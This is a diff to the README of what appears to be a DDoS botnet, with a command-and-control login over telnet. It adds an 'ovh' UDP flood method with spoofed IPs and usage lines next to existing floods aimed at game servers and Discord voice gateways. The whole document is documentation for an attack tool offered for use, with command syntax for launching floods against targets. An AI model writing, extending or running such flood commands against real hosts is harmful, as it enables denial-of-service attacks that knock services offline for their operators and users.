@@ -168,6 +168,7 @@ telnet <cnc-ip> 6621
 | `raknet` | RakNet game server flood (Minecraft PE, GTA V, etc.) |
 | `fivem` | FiveM game server connect flood |
 | `discord` | Discord voice gateway flood |
+| `ovh` | OVH UDP flood with spoofed IPs |
 
 ### Usage
 ```
@@ -206,6 +207,10 @@ vse example.com 27015 60 512
 raknet 1.2.3.4 19132 60 24
 fivem example.com 30120 60 512
 discord 1.2.3.4 19309 60 512
+
+# OVH
+ovh example.com 80 60 512
+ovh example.com 80 60 1024 pps=500
 ```
 
 ### Common Options
